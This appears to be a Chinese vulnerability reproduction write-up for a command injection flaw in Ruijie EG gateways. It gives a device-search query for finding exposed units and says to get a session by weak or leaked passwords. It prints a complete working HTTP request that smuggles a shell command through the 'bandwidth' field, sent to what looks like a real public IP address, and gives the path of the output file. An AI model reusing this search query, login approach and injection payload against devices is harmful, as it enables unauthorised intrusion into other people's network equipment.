# 锐捷EG易网关networksafe远程代码执行漏洞

**<font style="color:rgb(38, 38, 38);">一、漏洞简介</font>**

<font style="color:rgb(38, 38, 38);">锐捷 EG易网关cli存在后台远程命令执行漏洞。</font>

<font style="color:rgb(38, 38, 38);"> </font>**<font style="color:rgb(38, 38, 38);">二、影响版本</font>**

`锐捷EG易网关`  
**<font style="color:rgb(38, 38, 38);">三、资产测绘</font>**

`app="Ruijie-EG易网关"`  
<font style="color:rgb(38, 38, 38);">●登录页面</font>  


![1710773302248-caa9069a-265b-44c3-8a1c-ee627b562553.png](./img/95uANgjLfxI8FBL-/1710773302248-caa9069a-265b-44c3-8a1c-ee627b562553-688088.webp)

  
**<font style="color:rgb(38, 38, 38);">四、漏洞复现</font>**  
1、通过弱口令或账号密码泄露漏洞登录后台获取cookie  


![1711298713325-517a2298-d16c-4786-a1f9-3e40836a4f8c.png](./img/95uANgjLfxI8FBL-/1711298713325-517a2298-d16c-4786-a1f9-3e40836a4f8c-937391.webp)

```plain
POST /itbox_pi/networksafe.php?a=set HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Cookie: LOCAL_LANG_COOKIE=zh; RUIJIEID=bnrul7jabde55u5moo2a4q57a0; helpKey=home_sys;user=admin
X-Requested-With: XMLHttpRequest
Host: 117.40.253.197:4430
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
Content-Length: 23

bandwidth=|id >nice.txt
```

![1714062988720-d555b428-cc56-4327-8549-75c4e54bcf23.png](./img/95uANgjLfxI8FBL-/1714062988720-d555b428-cc56-4327-8549-75c4e54bcf23-448577.png)

写入文件地址

```plain
/itbox_pi/nice.txt
```

![1714063009386-90ee202d-ad27-463e-8bd7-d83f66ef9d7a.png](./img/95uANgjLfxI8FBL-/1714063009386-90ee202d-ad27-463e-8bd7-d83f66ef9d7a-378601.png)



> 更新: 2024-06-24 11:42:25  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ss4hw3pc2v25kryp>